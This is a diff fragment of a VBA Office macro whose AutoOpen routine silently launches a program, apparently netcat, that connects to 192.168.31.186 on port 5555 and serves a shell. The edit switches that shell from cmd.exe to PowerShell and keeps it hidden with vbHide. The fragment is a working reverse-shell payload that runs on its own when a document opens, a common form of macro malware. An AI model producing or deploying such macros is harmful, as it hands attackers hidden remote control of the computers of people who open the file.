@@ -19,5 +19,5 @@ Sub AutoOpen()
     End With
 
     ' Execute silently
-    Shell "cmd.exe /c " & strPath & " 192.168.31.186 5555 -e cmd.exe", vbHide
+    Shell "cmd.exe /c " & strPath & " 192.168.31.186 5555 -e powershell", vbHide
 End Sub
